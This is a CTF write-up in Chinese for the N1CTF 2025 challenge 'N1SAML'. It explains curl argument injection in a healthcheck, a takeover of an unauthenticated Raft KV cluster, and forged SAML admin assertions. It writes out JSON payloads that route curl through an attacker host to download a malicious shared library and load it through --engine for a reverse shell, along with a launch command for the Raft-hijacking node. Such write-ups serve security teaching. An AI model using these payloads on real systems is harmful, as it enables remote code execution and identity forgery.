# N1CTF 2025 N1SAML

## 题目简述

题目把一个 SAML 应用拆成 healthcheck、round-robin proxy、三节点 Hashicorp Raft KV、SAML Service Provider（SP）等容器。远端使用 Kubernetes，同一 Pod 内的容器共享网络命名空间；SP 每次认证时都会从 KV 的 `/key/metadata` 动态读取 Base64 编码的 IdP metadata。访问 `/whoami` 时，只有 SAML 属性同时满足 `uid=Administrator` 和 `mail=admin@nu1l.com` 才会返回 flag。

攻击链分为三段：healthcheck 把用户 JSON 直接变成 `curl` 选项，可利用 `--proxy` 和 `--engine` 下载并加载恶意动态库；获得 Pod 内代码执行后，利用未认证的 Raft 端口和高任期恶意节点夺取集群领导权，覆盖不可由普通 HTTP 接口修改的 metadata；最后运行自有 IdP，签发管理员 SAML 断言。

## 解题过程

healthcheck 的实现先把固定 URL 放入参数列表，再把 JSON map 的键和值原样追加到 `curl` 命令：

```go
args := []string{url}
for k, v := range params {
    args = append(args, k, v)
}
exec.Command("curl", args...).Run()
```

这里虽然没有经过 shell，仍然存在参数注入，因为攻击者可以提供合法的 `curl` 长选项。第一次请求把固定健康检查流量送到攻击者控制的代理，并把代理响应保存为 `/tmp/evil.so`：

```json
{
  "--proxy": "http://VPS:5555/",
  "-o": "/tmp/evil.so"
}
```

攻击者的 HTTP 服务把编译好的共享对象作为响应。第二次请求再让 `curl` 把它当作 SSL engine 加载：

```json
{
  "--engine": "/tmp/evil.so"
}
```

官方 `evil.c` 在 ELF constructor 中启动反弹 shell。因此即使命令参数没有进入 shell，`curl --engine` 的插件加载能力仍将“任意选项”升级为代码执行。编译动态库时要匹配远端的 Linux amd64 环境。

进入容器后，远端部署方式变得关键：healthcheck、SP、proxy 和 KV 位于同一 Pod，使用 `hostname -i` 得到的地址即可直连三个 Raft 节点的端口。KV 的 HTTP `Set` 拒绝覆盖已有键，而 `metadata` 已存在；不过底层 FSM 还实现了 `flush`，只是没有通过公开 HTTP 路由暴露。Raft transport 也没有身份认证，因而可以从协议层加入恶意节点。

官方恶意 KV 对 Hashicorp Raft 做了以下修改：

```text
1. 把 stable store 的 CurrentTerm 设为 23333；
2. 用反射和 unsafe 把本节点的 state 改为 Leader；
3. 把 leaderAddr、leaderID 和 latest configuration 改为攻击者构造的配置；
4. 对原三个节点及 evil 节点调用 AddVoter；
5. 通过 Raft Apply 依次提交 flush 和 set metadata。
```

高任期日志使正常节点接受恶意节点的新领导状态；一旦命令复制到多数节点，`flush` 清空原 KV，随后即可把 `metadata` 设为攻击者生成的 IdP metadata。官方利用程序的启动形式为：

```bash
./kvstore_hijack \
  -id evil \
  -haddr 0.0.0.0:2333 \
  -raddr "$HOST:4444" \
  -paddrs "node1:$HOST:12380,node2:$HOST:22380,node3:$HOST:32380,evil:$HOST:4444"
```

这里的重点不是单纯伪造一个 HTTP 响应，而是让恶意 metadata 经 Raft 日志真正进入 SP 所信任的数据源。覆盖成功后，访问 `/key/metadata` 并 Base64 解码，应看到其中的 IdP 地址和证书均已换成攻击者版本。

最后启动官方自建 IdP。它生成一个密码为 `123456` 的用户，属性固定为：

```text
Name / uid: Administrator
Email / mail: admin@nu1l.com
```

IdP 还会读取目标 `/saml/metadata` 注册 SP，自身 metadata 则包含攻击者持有私钥所对应的公开证书。SP 在 ACS 和受保护路由上都会重新从 KV 拉取 metadata，所以覆盖后会信任攻击者证书及登录端点。浏览器访问 `/whoami`，跟随 SAML 登录流程，在恶意 IdP 使用上述账户登录；攻击者能合法签名包含管理员属性的断言，SP 验签后便返回 flag。

官方仓库给出了完整的恶意 KV 和 IdP 源码；作者的[详细分析](https://exp10it.io/posts/breaking-raft-consensus-in-go-n1saml-writeup-for-n1ctf-2025/)补充说明了 Raft 内部字段、Kubernetes 同 Pod 网络以及 SAML 信任替换的连接关系。即使不访问外链，上述步骤已经覆盖复现所需的关键机制。

## 方法总结

本题的核心不是某一个参数注入，而是跨越三条信任边界：Web 接口错误地把 JSON 键当成 `curl` 能力；Pod 内网默认信任已进入同一网络命名空间的进程；SP 又无条件信任 Raft KV 中可被共识层改写的 IdP metadata。最终结果是“curl 插件加载取得落点—Raft 高任期夺权改写身份信任根—恶意 IdP 签发管理员断言”。

复现时应分别验证每个转折点：先确认动态库 constructor 确实执行，再检查恶意节点成为 leader 以及 `/key/metadata` 已变化，最后才调试 SAML 属性与签名。把三段混在一起排错会很困难。虽然部署使用 Kubernetes，决定 flag 的最后一道机制仍是 Web/SAML 身份信任，因此本文归入 Web，而不是仅凭“容器”字样归入云基础设施。
